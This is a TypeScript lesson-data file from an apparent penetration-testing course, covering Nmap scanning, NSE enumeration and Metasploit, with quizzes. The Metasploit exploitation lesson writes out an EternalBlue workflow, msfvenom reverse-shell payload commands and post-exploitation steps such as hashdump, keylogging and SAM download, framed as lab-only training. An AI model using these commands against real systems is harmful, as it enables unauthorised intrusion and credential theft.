import type { Module } from '../types';

export const phase5: Module[] = [
  {
    id: 'week30',
    title: 'Advanced Nmap & Reconnaissance',
    durationText: 'Week 30',
    focus: 'Master Nmap scan types, NSE scripts, and service enumeration for effective reconnaissance.',
    output: 'Reconnaissance report with scan results from a local lab target.',
    topics: [
      {
        id: 'we30d01',
        title: 'Nmap Scan Types',
        description: 'Deep dive into TCP/UDP scan types, timing options, and output formats.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Distinguish between TCP SYN, Connect, NULL, FIN, Xmas, and UDP scans
- Apply timing templates to balance speed and stealth
- Produce and interpret Nmap output in multiple formats
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## TCP SYN Scan (\`-sS\`)
The default and most popular scan type. Sends SYN packets and analyzes responses without completing the TCP handshake (half-open scan).

\`\`\`bash
nmap -sS 192.168.1.100
\`\`\`

- **Open port:** Target responds with SYN/ACK → Nmap sends RST (no connection established)
- **Closed port:** Target responds with RST
- **Filtered:** No response or ICMP unreachable
- Requires root/admin privileges

## TCP Connect Scan (\`-sT\`)
Completes the full TCP three-way handshake. Does not require root privileges but is easily logged.

\`\`\`bash
nmap -sT 192.168.1.100
\`\`\`

Use when SYN scan is unavailable (non-root user, certain proxy situations).

## Stealth Scans

### NULL Scan (\`-sN\`)
Sends packets with no TCP flags set. Relies on RFC 793 behavior: closed ports respond with RST, open ports ignore the packet.

\`\`\`bash
nmap -sN 192.168.1.100
\`\`\`

### FIN Scan (\`-sF\`)
Sends packets with only the FIN flag set. Same RFC 793 logic as NULL scan.

\`\`\`bash
nmap -sF 192.168.1.100
\`\`\`

### Xmas Scan (\`-sX\`)
Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.

\`\`\`bash
nmap -sX 192.168.1.100
\`\`\`

:::warning
NULL, FIN, and Xmas scans are easily bypassed by modern firewalls and IDS/IPS that do not follow RFC 793 strictly. They also cannot distinguish open from filtered ports on many systems.
:::

## UDP Scan (\`-sU\`)
Scans for open UDP ports. Significantly slower than TCP scans because most systems rate-limit ICMP "port unreachable" messages.

\`\`\`bash
nmap -sU 192.168.1.100
nmap -sU --top-ports 100 192.168.1.100  # scan only the 100 most common UDP ports
\`\`\`

:::tip
Combine with \`--reason\` flag to see why Nmap classified a port as open, closed, or filtered.
:::

## Timing Templates (\`-T\`)

| Flag | Name        | Description                              |
|------|-------------|------------------------------------------|
| \`-T0\` | Paranoid    | Very slow, IDS evasion, serialized scans |
| \`-T1\` | Sneaky      | Slow, IDS evasion                        |
| \`-T2\` | Polite      | Slowed down, less bandwidth              |
| \`-T3\` | Normal      | Default timing                           |
| \`-T4\` | Aggressive  | Fast, reliable on local networks         |
| \`-T5\` | Insane      | Very fast, may miss ports or overwhelm   |

\`\`\`bash
nmap -T4 -sS 192.168.1.100
\`\`\`

:::tip
For local lab work, \`-T4\` is almost always appropriate. Use \`-T5\` only when scanning localhost.
:::

## Output Formats

| Flag     | Format           | Use Case                          |
|----------|------------------|-----------------------------------|
| \`-oN\`   | Normal text      | Human-readable results            |
| \`-oX\`   | XML              | Parsing by tools (Metasploit, etc)|
| \`-oG\`   | Grepable         | Quick grep parsing                |
| \`-oA\`   | All formats      | Outputs .nmap, .xml, and .gnmap   |

\`\`\`bash
nmap -sS -oA scan_results 192.168.1.100
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap
\`\`\`

:::checkpoint
Try running these scans against a local VM and compare the output formats. Which scan type produces the most reliable results on your lab setup?
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'When would you choose a SYN scan over a TCP Connect scan, and what are the tradeoffs of stealth scans like NULL, FIN, and Xmas?',
        interviewAnswer: 'SYN scan is preferred because it does not complete the TCP handshake, making it faster and less likely to be logged. TCP Connect scan completes the handshake and is easily logged but does not require root privileges. NULL, FIN, and Xmas scans can evade some firewalls but are unreliable on modern systems that do not strictly follow RFC 793, making them unable to distinguish open from filtered ports.',
        quiz: [
          {
            question: 'Which Nmap scan type sends SYN packets without completing the TCP handshake?',
            options: ['TCP Connect scan (-sT)', 'TCP SYN scan (-sS)', 'NULL scan (-sN)', 'UDP scan (-sU)'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'SYN scan sends a SYN and waits for SYN/ACK, then sends RST instead of completing the handshake.',
            certTags: ['CEH', 'CompTIA Security+', 'OSCP']
          },
          {
            question: 'What privilege is required to run an Nmap SYN scan on Linux?',
            options: ['None - any user can run it', 'Root or sudo privileges', 'Only the admin group', 'CAP_NET_RAW capability only'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'SYN scan uses raw sockets to craft packets, which requires root privileges on Linux.',
            certTags: ['CompTIA Security+']
          },
          {
            question: 'Which scan type sets the FIN, PSH, and URG flags simultaneously?',
            options: ['NULL scan', 'FIN scan', 'Xmas scan', 'ACK scan'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'The Xmas scan lights up multiple flags: FIN, PSH, and URG.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'Why are NULL, FIN, and Xmas scans unreliable on modern networks?',
            options: ['They require root privileges', 'Modern firewalls and IDS often ignore RFC 793 behavior', 'They only work on Windows targets', 'Nmap has deprecated them'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Many modern systems do not strictly follow RFC 793, making these scans unable to distinguish open from filtered ports.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What is the main disadvantage of a UDP scan (-sU)?',
            options: ['It cannot detect open ports', 'It is significantly slower due to ICMP rate limiting', 'It requires a TCP connection first', 'It does not work on Linux'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'UDP scans are slow because most systems rate-limit ICMP port unreachable messages.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Which timing template should you use for fast, reliable scans on a local lab network?',
            options: ['-T0 (Paranoid)', '-T2 (Polite)', '-T4 (Aggressive)', '-T5 (Insane)'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: '-T4 (Aggressive) provides fast and reliable results on local networks without the risk of overwhelming the target.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the -oA flag do in Nmap?',
            options: ['Outputs only XML format', 'Outputs results in Normal, XML, and Grepable formats', 'Outputs only grepable format', 'Saves results to a database'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: '-oA outputs in all three formats: .nmap (normal), .xml, and .gnmap (grepable).',
            certTags: ['OSCP']
          },
          {
            question: 'Which Nmap flag is used to show why Nmap classified a port as open, closed, or filtered?',
            options: ['--reason', '--verbose', '--debug', '--trace'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'The --reason flag displays the raw packet response that caused Nmap to classify a port a certain way.',
            certTags: ['OSCP']
          },
          {
            question: 'A TCP Connect scan (-sT) completes the full three-way handshake. What is a disadvantage compared to SYN scan?',
            options: ['It cannot detect open ports', 'It is easily logged by the target system', 'It requires root privileges', 'It cannot scan UDP ports'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'A full TCP connection is established, which means the connection is logged in most systems.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Which Nmap flag limits a UDP scan to only the most common ports?',
            options: ['--top-ports 100', '--fast', '--min-rate 100', '--max-retries 1'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: '--top-ports N tells Nmap to scan only the N most commonly open ports, drastically reducing scan time for UDP.',
            certTags: ['OSCP']
          },
          {
            question: 'What response does Nmap expect from an open port during a NULL scan on a system strictly following RFC 793?',
            options: ['RST packet', 'SYN/ACK packet', 'No response (packet ignored)', 'ICMP unreachable'],
            correctAnswerIndex: 2,
            difficulty: 'advanced',
            explanation: 'Per RFC 793, open ports should ignore packets with no flags set, resulting in no response.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'Which combination of flags produces a Xmas scan targeting the top 50 UDP ports?',
            options: ['nmap -sX -sU --top-ports 50 target', 'nmap -sX --top-ports 50 target', 'nmap -sU --top-ports 50 target', 'nmap -sX -sU -p 1-50 target'],
            correctAnswerIndex: 0,
            difficulty: 'advanced',
            explanation: 'Combining -sX (TCP Xmas) with -sU (UDP) scans both TCP and UDP. --top-ports 50 limits UDP to the top 50 ports.',
            certTags: ['OSCP']
          },
          {
            question: 'What happens when Nmap sends a SYN packet to a closed port during a SYN scan?',
            options: ['No response', 'SYN/ACK response', 'RST response', 'ICMP unreachable'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'Closed ports respond with a RST (reset) packet to a SYN.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Which timing flag causes Nmap to serialize all probes and randomize scan order to evade IDS?',
            options: ['-T1 (Sneaky)', '-T0 (Paranoid)', '-T2 (Polite)', '-T3 (Normal)'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: '-T0 (Paranoid) serializes all scans, randomizes the order, and sends one probe at a time to evade detection.',
            certTags: ['CEH']
          }
        ]
      },
      {
        id: 'we30d02',
        title: 'NSE Scripts & Service Enumeration',
        description: 'Leverage Nmap Scripting Engine categories for deep service enumeration and vulnerability detection.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Identify NSE script categories and their use cases
- Enumerate HTTP, SMB, and other services with NSE scripts
- Perform OS and version detection with Nmap
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## Nmap Scripting Engine (NSE)

NSE extends Nmap's capabilities with Lua scripts. Scripts are organized by category:

| Category     | Purpose                                    |
|-------------|--------------------------------------------|
| \`auth\`     | Authentication bypass and testing          |
| \`brute\`    | Brute-force attacks against services       |
| \`default\`  | Safe, default scripts (\`-sC\` enables these)|
| \`discovery\`| Active information gathering              |
| \`dos\`      | Denial of service testing (use carefully) |
| \`exploit\`  | Attempt to exploit vulnerabilities        |
| \`fuzzer\`   | Fuzzing for unexpected responses           |
| \`intrusive\`| Scripts that may crash services or annoy  |
| \`safe\`     | Safe scripts that will not harm targets   |
| \`vuln\`     | Check for specific vulnerabilities        |

## Basic NSE Usage

\`\`\`bash
# Run default scripts (equivalent to -sC)
nmap --script=default 192.168.1.100

# Run all scripts in a category
nmap --script=vuln 192.168.1.100

# Run specific scripts
nmap --script=http-title,http-headers 192.168.1.100

# Run scripts with arguments
nmap --script=http-brute --script-args http-brute.path=/admin 192.168.1.100
\`\`\`

## Service Enumeration Scripts

### HTTP Enumeration
\`\`\`bash
# Discover web technologies and headers
nmap --script=http-title,http-headers,http-methods 192.168.1.100

# Find hidden directories
nmap --script=http-enum 192.168.1.100

# Detect web application firewalls
nmap --script=http-waf-detect 192.168.1.100
\`\`\`

### SMB Enumeration
\`\`\`bash
# List SMB shares
nmap --script=smb-enum-shares,smb-enum-users 192.168.1.100

# Detect SMB version and signing
nmap --script=smb-security-mode,smb-os-discovery 192.168.1.100

# Check for SMB vulnerabilities
nmap --script=smb-vuln-ms17-010 192.168.1.100
\`\`\`

### SSH Enumeration
\`\`\`bash
nmap --script=ssh2-enum-algos,ssh-hostkey 192.168.1.100
\`\`\`

## Version and OS Detection

### Service Version Detection (\`-sV\`)
\`\`\`bash
nmap -sV 192.168.1.100
nmap -sV --version-intensity 9 192.168.1.100  # more aggressive probing
\`\`\`

### OS Detection (\`-O\`)
\`\`\`bash
nmap -O 192.168.1.100
nmap -O --osscan-guess 192.168.1.100  # guess OS even if uncertain
\`\`\`

### Aggressive Scan (\`-A\`)
Combines OS detection, version detection, script scanning, and traceroute:
\`\`\`bash
nmap -A 192.168.1.100
\`\`\`

:::warning
The -A flag runs intrusive NSE scripts that may be detected by IDS/IPS. Only use against authorized targets.
:::

## Recommended Scan Workflow

\`\`\`bash
# Step 1: Quick host discovery
nmap -sn 192.168.1.0/24

# Step 2: Port scan with version detection
nmap -sS -sV -T4 192.168.1.100

# Step 3: Deep enumeration with NSE
nmap --script=default,vuln -sV 192.168.1.100

# Step 4: Save results
nmap -sS -sV -A -oA recon_results 192.168.1.100
\`\`\`

:::tip
Always save your Nmap output. You will reference it throughout the entire penetration test.
:::

:::checkpoint
Run \`nmap -sV -sC --script=vuln\` against a local VM and document every finding. Can you identify the OS, services, and any known vulnerabilities?
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you use NSE scripts for service enumeration, and what is the recommended Nmap workflow for a penetration test?',
        interviewAnswer: 'NSE scripts extend Nmap with Lua scripts organized by category. The recommended workflow is: first discover hosts with nmap -sn, then scan ports with -sS -sV, enumerate services with --script=default,vuln, and save output with -oA. Use specific scripts like smb-enum-shares for SMB enumeration and http-enum for web directory discovery. Always save output for later reference throughout the engagement.',
        quiz: [
          {
            question: 'Which Nmap flag combination is equivalent to running default NSE scripts?',
            options: ['--script=default', '-sC', 'Both --script=default and -sC', '--script=default,vuln'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: '-sC is shorthand for --script=default. Both run the default set of NSE scripts.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'Which NSE category would you use to check for known CVEs on a target?',
            options: ['discovery', 'default', 'vuln', 'exploit'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'The vuln category contains scripts that check for specific known vulnerabilities.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'What does the -sV flag do in Nmap?',
            options: ['Detects the operating system', 'Scans for virtual hosts', 'Probes open ports to determine service versions', 'Runs NSE vulnerability scripts'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: '-sV sends probes to open ports and analyzes responses to determine the exact service and version.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'Which NSE script would you use to enumerate SMB shares on a Windows target?',
            options: ['ssh-hostkey', 'smb-enum-shares', 'http-enum', 'ftp-anon'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'smb-enum-shares lists all SMB shares available on the target.',
            certTags: ['CEH']
          },
          {
            question: 'What does nmap -A combine?',
            options: ['Only OS detection and traceroute', 'OS detection, version detection, script scanning, and traceroute', 'SYN scan and UDP scan', 'Port scan and brute force'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: '-A is an aggressive scan that combines OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'How do you run only the smb-vuln-ms17-010 script against a target?',
            options: ['nmap --script=smb-vuln-ms17-010 target', 'nmap --script=vuln target', 'nmap -sV --script=smb-vuln target', 'nmap --script=smb-vuln target'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'You specify the exact script name after --script= to run only that script.',
            certTags: ['CEH']
          },
          {
            question: 'Which NSE category contains scripts that may crash services or cause disruption?',
            options: ['safe', 'default', 'intrusive', 'discovery'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'The intrusive category includes scripts that may be disruptive and should be used with caution.',
            certTags: ['CEH']
          },
          {
            question: 'What does --version-intensity 9 do with the -sV flag?',
            options: ['Limits version probes to only common ones', 'Uses more aggressive version detection probes', 'Reduces scan speed to minimum', 'Enables OS detection alongside version detection'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Higher intensity values cause Nmap to try more probes, increasing the chance of correct version identification at the cost of scan time.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the first step in a recommended Nmap reconnaissance workflow?',
            options: ['Run a full vulnerability scan', 'Perform host discovery with nmap -sn', 'Run SYN scan on all 65535 ports', 'Execute NSE brute-force scripts'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Host discovery identifies live hosts before investing time in full port scans.',
            certTags: ['OSCP']
          },
          {
            question: 'Which flag makes Nmap guess the OS even when the confidence is low?',
            options: ['--osscan-guess', '--aggressive', '--os-detect-all', '--guess-os'],
            correctAnswerIndex: 0,
            difficulty: 'intermediate',
            explanation: '--osscan-guess forces Nmap to provide its best OS guess even when confidence is below the normal threshold.',
            certTags: ['OSCP']
          },
          {
            question: 'What NSE script checks for SMB message signing configuration?',
            options: ['smb-enum-shares', 'smb-security-mode', 'smb-os-discovery', 'smb-brute'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'smb-security-mode reveals whether SMB signing is required, enabled, or disabled.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'How do you pass arguments to an NSE script?',
            options: ['--script-args key=value', '--args key=value', '--params key=value', '--set key=value'],
            correctAnswerIndex: 0,
            difficulty: 'intermediate',
            explanation: 'The --script-args flag passes key=value arguments to the NSE script being run.',
            certTags: ['OSCP']
          },
          {
            question: 'Which NSE script would you use to discover hidden directories on a web server?',
            options: ['http-headers', 'http-enum', 'http-title', 'http-methods'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'http-enum probes common web directory and file paths to find hidden content.',
            certTags: ['CEH']
          },
          {
            question: 'What does the ssh2-enum-algos script reveal?',
            options: ['SSH server version', 'Supported SSH key exchange and encryption algorithms', 'SSH user accounts', 'SSH password strength'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'ssh2-enum-algos lists all cryptographic algorithms the SSH server supports, which may reveal weak algorithms.',
            certTags: ['CEH']
          }
        ]
      }
    ]
  },
  {
    id: 'week31',
    title: 'Metasploit Framework',
    durationText: 'Week 31',
    focus: 'Understand Metasploit architecture, module types, and execute exploitation workflows against local lab targets.',
    output: 'Completed exploitation exercise with Meterpreter session screenshots.',
    topics: [
      {
        id: 'we31d01',
        title: 'Metasploit Architecture',
        description: 'Navigate the msfconsole interface, understand module categories, and manage payloads.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Navigate the msfconsole interface and core commands
- Differentiate between exploit, auxiliary, payload, and other module types
- Understand staged vs. stageless payloads and LHOST/LPORT/RHOST/RPORT
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## Starting Metasploit

\`\`\`bash
# Start PostgreSQL database (for caching)
sudo msfdb init

# Launch Metasploit
msfconsole
\`\`\`

The msfconsole provides a unified interface to all Metasploit functionality.

## Module Types

| Module Type | Purpose                                         |
|------------|------------------------------------------------|
| \`exploit\`  | Exploit a vulnerability to gain access          |
| \`auxiliary\`| Scanning, fuzzing, enumeration, DoS             |
| \`post\`     | Post-exploitation tasks on compromised hosts    |
| \`payload\`  | Code that runs after exploitation              |
| \`encoder\`  | Encode payloads to avoid detection              |
| \`nop\`      | NOP sleds to pad payload buffers                |

## Core Commands

\`\`\`bash
# Search for modules
search type:exploit platform:windows
search eternalblue
search smb

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Show module options
show options

# Show available payloads for current exploit
show payloads

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Check current settings
check

# Run the exploit
exploit
# or
run
\`\`\`

:::tip
Use \`back\` to return from the current module, and \`info\` to see detailed module information.
:::

## Payloads: Staged vs. Stageless

| Type       | Example                                    | Description                                  |
|-----------|--------------------------------------------|----------------------------------------------|
| Stageless | \`windows/x64/meterpreter_reverse_tcp\`    | Full payload in one packet; larger but simpler|
| Staged    | \`windows/x64/meterpreter/reverse_tcp\`    | Small stager + full payload delivered separately; smaller initial packet |

:::concept
**Staged payloads** use a small stager that connects back to load the full Meterpreter DLL. The '/' in the payload name indicates it is staged. Stageless payloads contain everything in one piece.
:::

## LHOST/LPORT/RHOST/RPORT

| Variable | Meaning                                  | Example           |
|---------|------------------------------------------|-------------------|
| RHOSTS  | Remote target IP or range                | 192.168.1.100     |
| RPORT   | Remote port the exploit targets          | 445               |
| LHOST   | Your machine's IP (listener address)     | 192.168.1.50      |
| LPORT   | Port your listener waits on              | 4444              |

:::warning
Always verify LHOST is your actual IP on the correct interface. Using the wrong IP will cause the payload to fail to connect back.
:::

## Database Features

\`\`\`bash
# View stored hosts
hosts

# View stored services
services

# View stored vulnerabilities
vulns

# Import Nmap XML results
db_import /path/to/scan.xml
\`\`\`

:::checkpoint
Start msfconsole, search for exploits targeting Windows SMB, and identify the options required for MS17-010. What are the default values for RHOSTS and LPORT?
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain the difference between staged and stageless payloads in Metasploit, and when you would use each.',
        interviewAnswer: 'Staged payloads use a small stager that connects back to load the full Meterpreter DLL, indicated by a forward slash in the name like windows/x64/meterpreter/reverse_tcp. Stageless payloads contain everything in one piece, indicated by an underscore. Use staged when you need a smaller initial payload to bypass size restrictions or detection, and stageless when you need a self-contained payload that does not require a second download.',
        quiz: [
          {
            question: 'What is the difference between a staged and stageless payload?',
            options: [
              'Staged payloads are encoded, stageless are not',
              'Staged payloads deliver code in multiple parts; stageless deliver the full payload at once',
              'Stageless payloads only work on Linux; staged only work on Windows',
              'There is no difference; the terms are interchangeable'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Staged payloads use a small stager to load the full payload, while stageless payloads contain everything in one transmission.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does the LHOST variable represent in a Metasploit payload?',
            options: ['The target machine IP', 'The port on the target', 'The attacker machine IP for the reverse connection', 'The exploit module path'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'LHOST is the IP address of the attacker machine where the payload connects back to.',
            certTags: ['OSCP', 'CEH', 'CompTIA Security+']
          },
          {
            question: 'Which Metasploit command searches for all exploits targeting Windows?',
            options: ['search type:exploit platform:windows', 'find windows exploits', 'locate exploit windows', 'scan windows'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'The search command with type:exploit and platform:windows filters results accordingly.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does the show payloads command display?',
            options: ['All exploits in the database', 'Payloads compatible with the current exploit module', 'All available encoders', 'Nmap scan results'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'show payloads lists payloads that are compatible with the currently selected exploit module.',
            certTags: ['OSCP']
          },
          {
            question: 'Which payload name format indicates a staged payload in Metasploit?',
            options: ['windows/x64/meterpreter_reverse_tcp (underscore)', 'windows/x64/meterpreter/reverse_tcp (forward slash)', 'Both formats indicate staged', 'Neither format indicates staged'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'The forward slash (/) in the payload name indicates a staged payload, while underscores indicate stageless.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the check command do in Metasploit before running an exploit?',
            options: ['Checks if the target is online', 'Tests if the target is vulnerable to the selected exploit', 'Checks your network connection', 'Validates the payload is correct'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'The check command tests whether the target appears vulnerable without actually exploiting it.',
            certTags: ['OSCP']
          },
          {
            question: 'Which module type is used for post-exploitation tasks like privilege escalation and persistence?',
            options: ['exploit', 'auxiliary', 'post', 'payload'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'Post modules are designed to run after gaining access, for tasks like privilege escalation and data gathering.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is the purpose of the db_import command?',
            options: ['Import Metasploit modules', 'Import Nmap XML results into the database', 'Import wordlists for brute forcing', 'Import payload definitions'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'db_import loads external scan results (like Nmap XML) into the Metasploit database for later use.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the back command do in msfconsole?',
            options: ['Returns to the previous module', 'Undoes the last exploit', 'Exits msfconsole', 'Returns to the main menu from a module'],
            correctAnswerIndex: 3,
            difficulty: 'beginner',
            explanation: 'back exits the currently selected module and returns to the main msfconsole prompt.',
            certTags: ['OSCP']
          },
          {
            question: 'Which Metasploit module type is used for scanning and enumeration without exploitation?',
            options: ['exploit', 'auxiliary', 'payload', 'encoder'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Auxiliary modules perform scanning, enumeration, fuzzing, and denial of service without exploiting vulnerabilities.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'Why is it important to verify LHOST before running a reverse payload?',
            options: ['LHOST determines the exploit success rate', 'An incorrect LHOST means the payload will connect to the wrong address and fail', 'LHOST is only used for documentation', 'LHOST changes the payload encoding'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The payload needs to connect back to the correct attacker IP. Wrong LHOST means the connection goes to the wrong place or fails entirely.',
            certTags: ['OSCP']
          },
          {
            question: 'What does msfdb init do?',
            options: ['Starts the Metasploit framework', 'Initializes the PostgreSQL database for Metasploit', 'Creates a new workspace', 'Downloads the latest exploit modules'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'msfdb init sets up the PostgreSQL database that Metasploit uses to store hosts, services, and vulnerabilities.',
            certTags: ['OSCP']
          },
          {
            question: 'What is a NOP sled used for in a payload?',
            options: ['Encrypting the payload', 'Padding the buffer to improve exploit reliability', 'Encoding the payload to avoid AV', 'Compressing the payload size'],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'A NOP sled provides a safe landing zone by filling buffer space with no-operation instructions, increasing the chance the execution lands on the payload.',
            certTags: ['OSCP', 'CEH']
          }
        ]
      },
      {
        id: 'we31d02',
        title: 'Metasploit Exploitation',
        description: 'Execute a full exploitation workflow using Metasploit against local lab targets.',
        type: 'practice',
        duration: '2 hours',
        content: `:::objectives
- Execute a complete Metasploit exploitation workflow
- Navigate Meterpreter sessions and perform basic post-exploitation
- Practice safe, authorized exploitation techniques
:::

:::warning
All exploitation techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test. Unauthorized computer access is illegal.
:::

## Full Exploitation Workflow

### Step 1: Reconnaissance (Nmap)
\`\`\`bash
nmap -sV -sC -p- 192.168.1.100 -oA preexploit
\`\`\`

### Step 2: Search for Exploits
\`\`\`bash
msfconsole
search type:exploit platform:windows smb
search type:exploit platform:windows eternalblue
\`\`\`

### Step 3: Select and Configure Exploit
\`\`\`bash
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
show payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
\`\`\`

### Step 4: Check and Exploit
\`\`\`bash
check
exploit
\`\`\`

:::tip
Always run \`check\` before \`exploit\` to verify if the target appears vulnerable. This saves time and avoids unnecessary noise.
:::

## Meterpreter Basics

Once you have a Meterpreter session:

\`\`\`bash
# System information
sysinfo

# Current user
getuid

# Spawn a regular Windows shell
shell

# Return to Meterpreter
exit

# Background the session
background

# List sessions
sessions -l

# Interact with a session
sessions -i 1
\`\`\`

## Post-Exploitation Commands

### Information Gathering
\`\`\`bash
hashdump              # Dump password hashes (requires SYSTEM privileges)
screenshot            # Capture the target's screen
keyscan_start         # Start keylogger
keyscan_dump          # Dump captured keystrokes
keyscan_stop          # Stop keylogger
\`\`\`

### File Operations
\`\`\`bash
upload /local/file.txt C:\\Windows\\Temp\\file.txt
download C:\\Windows\\System32\\config\\SAM /tmp/SAM
ls
cd C:\\Users
\`\`\`

### Network and Persistence
\`\`\`bash
ipconfig              # View network interfaces
arp                   # View ARP table
route                 # View routing table
\`\`\`

## Alternative: msfvenom for Payload Generation

\`\`\`bash
# Generate a Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Generate a Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Generate a PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
\`\`\`

:::warning
Only generate and use payloads against systems you own for educational purposes. Never deploy payloads on unauthorized systems.
:::

## Handling Sessions

\`\`\`bash
# List all active sessions
sessions -l

# Background current session
background

# Bring session to foreground
sessions -i 1

# Kill a session
sessions -k 1

# Kill all sessions
sessions -K
\`\`\`

:::checkpoint
Complete a full exploitation chain against a local vulnerable VM: scan with Nmap, find an exploit in Metasploit, exploit the target, and demonstrate a Meterpreter session with sysinfo and getuid output.
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Walk me through a complete Metasploit exploitation workflow from reconnaissance to post-exploitation.',
        interviewAnswer: 'Start with Nmap reconnaissance to identify open ports and services, then search Metasploit for compatible exploits. Configure the exploit with RHOSTS, LHOST, and appropriate payload, run check to verify vulnerability, then exploit. After gaining a Meterpreter session, use sysinfo and getuid to understand your context, then escalate privileges, dump hashes with hashdump, and document everything for the report.',
        quiz: [
          {
            question: 'What is the first step in the Metasploit exploitation workflow?',
            options: ['Run the exploit immediately', 'Set LHOST and LPORT', 'Perform reconnaissance with Nmap', 'Generate a payload with msfvenom'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'Reconnaissance identifies open ports and services, which determines which exploit to use.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does the Meterpreter getuid command return?',
            options: ['The target system information', 'The current user context of the Meterpreter session', 'The list of users on the system', 'The group memberships of the current user'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'getuid returns the user account under which Meterpreter is currently running.',
            certTags: ['OSCP']
          },
          {
            question: 'How do you background a Meterpreter session?',
            options: ['Type exit', 'Type background', 'Press Ctrl+C', 'Type sessions -k'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The background command sends the current session to the background while keeping it active.',
            certTags: ['OSCP']
          },
          {
            question: 'What command in Meterpreter dumps password hashes from the target?',
            options: ['dump_hashes', 'hashdump', 'get_hashes', 'password_dump'],
            correctAnswerIndex: 1,
